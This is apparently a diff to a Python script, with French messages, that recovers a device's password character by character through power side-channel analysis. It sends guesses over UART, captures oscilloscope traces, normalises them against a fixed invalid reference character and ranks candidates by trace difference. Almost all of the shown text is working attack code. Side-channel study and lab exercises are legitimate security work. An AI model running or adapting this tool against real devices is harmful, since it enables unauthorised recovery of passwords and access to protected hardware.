@@ -12,15 +12,17 @@ import numpy as np
 
 TARGET_PASSWORD_LENGTH = 8
 DEFAULT_CHARACTER_SET = string.ascii_letters + string.digits + string.punctuation
+REFERENCE_CHARACTER = "\x01"
 UART_BAUD = 9600
 ADC_SAMPLES = 12000
 PLOT_SAMPLES = 2500
-TRACES_PER_CANDIDATE = 5
+TRACES_PER_CANDIDATE = 7
 RESPONSE_TIMEOUT = 2.0
 UART_IDLE_TIMEOUT_MS = 50
 RESET_PULSE_SECONDS = 0.05
 RESET_SETTLE_SECONDS = 0.3
 RESET_DRAIN_READS = 20
+BASELINE_SAMPLES = 150
 PLOT_DIR = os.path.dirname(os.path.abspath(__file__))
 
 
@@ -162,6 +164,22 @@ def print_trace_stats(label: str, trace: np.ndarray) -> None:
     )
 
 
+def normalize_trace(trace: np.ndarray) -> np.ndarray:
+    baseline = trace[:BASELINE_SAMPLES]
+    if baseline.size == 0:
+        return trace
+    return trace - float(np.mean(baseline))
+
+
+def score_difference(trace: np.ndarray, reference_trace: np.ndarray) -> float:
+    sample_count = min(PLOT_SAMPLES, trace.size, reference_trace.size)
+    return float(
+        np.sum(
+            np.abs(trace[:sample_count] - reference_trace[:sample_count])
+        )
+    )
+
+
 def plot_character_analysis(
     position: int,
     candidate_medians: dict[str, np.ndarray],
@@ -186,7 +204,7 @@ def plot_character_analysis(
         reference_trace[:sample_count],
         color="black",
         linewidth=1.5,
-        label="Reference (mediane des candidats)",
+        label="Reference invalide fixe",
     )
     for rank, character in enumerate(plotted_characters):
         color = "crimson" if rank == 0 else colors(rank)
@@ -256,56 +274,81 @@ def recover_characters(
 
     for position in range(password_length):
         candidate_traces: dict[str, list[np.ndarray]] = {}
+        candidate_scores: dict[str, list[float]] = {}
+        reference_traces: list[np.ndarray] = []
         print(
             f"\nSelection du caractere {position + 1}/{password_length}; "
             f"prefixe estime: {recovered!r}"
         )
-        for candidate_index, character in enumerate(charset, start=1):
+        for character in charset:
             candidate_traces[character] = []
-            guess = recovered + character
-            for repetition in range(1, repetitions + 1):
+            candidate_scores[character] = []
+
+        for repetition in range(1, repetitions + 1):
+            reference_guess = recovered + REFERENCE_CHARACTER
+            reference_trace, reference_response = capture_probe(
+                scope, target, reference_guess
+            )
+            reference_trace = normalize_trace(reference_trace)
+            reference_traces.append(reference_trace)
+            reference_result = (
+                "accepted" if "ACCESS GRANTED" in reference_response else "denied"
+            )
+            print(
+                f"  Reference {repetition}/{repetitions}, "
+                f"UART TX={reference_guess!r} + LF: {reference_result}"
+            )
+            print_trace_stats("Trace reference", reference_trace)
+
+            for candidate_index, character in enumerate(charset, start=1):
+                guess = recovered + character
                 trace, response = capture_probe(scope, target, guess)
+                trace = normalize_trace(trace)
                 candidate_traces[character].append(trace)
+                score = score_difference(trace, reference_trace)
+                candidate_scores[character].append(score)
                 result = "accepted" if "ACCESS GRANTED" in response else "denied"
                 print(
                     f"  Candidat {candidate_index:2d}/{len(charset)}, "
                     f"UART TX={guess!r} + LF, "
-                    f"capture {repetition}/{repetitions}: "
-                    f"{result}"
+                    f"capture {repetition}/{repetitions}: {result}, "
+                    f"score={score:.2f}"
                 )
-                print_trace_stats("Trace", trace)
+                print_trace_stats("Trace candidat", trace)
+                if "ACCESS GRANTED" in response:
+                    recovered += character
+                    print(f"\nMot de passe estime: {recovered!r}")
+                    return recovered
 
         candidate_medians = {
             character: np.median(np.stack(waves, axis=0), axis=0)
             for character, waves in candidate_traces.items()
         }
-        sample_count = min(
-            PLOT_SAMPLES,
-            min(trace.size for trace in candidate_medians.values()),
-        )
-        reference_trace = np.median(
-            np.stack(list(candidate_medians.values()), axis=0),
-            axis=0,
-        )
+        reference_trace = np.median(np.stack(reference_traces, axis=0), axis=0)
         scores = {
-            character: float(
-                np.sum(
-                    np.abs(
-                        trace[:sample_count] - reference_trace[:sample_count]
-                    )
-                )
-            )
-            for character, trace in candidate_medians.items()
+            character: float(np.median(candidate_scores[character]))
+            for character in charset
         }
-        ranking = sorted(scores, key=scores.__getitem__, reverse=True)
+        ranking = sorted(
+            scores,
+            key=lambda character: (
+                scores[character],
+                float(np.mean(candidate_scores[character])),
+            ),
+            reverse=True,
+        )
         best_character = ranking[0]
 
         print(f"Classement pour la position {position + 1}:")
         for rank, character in enumerate(ranking[:5], start=1):
             print(
                 f"  {rank}. {character!r} (ASCII 0x{ord(character):02X}), "
-                f"score={scores[character]:.2f}"
+                f"score median={scores[character]:.2f}, "
+                f"score moyen={float(np.mean(candidate_scores[character])):.2f}"
             )
+        if len(ranking) > 1:
+            gap = scores[ranking[0]] - scores[ranking[1]]
+            print(f"  Ecart top1-top2: {gap:.2f}")
         print(
             "  Le caractere ayant le score le plus eleve est une estimation, "
             "a confirmer sur le graphe."
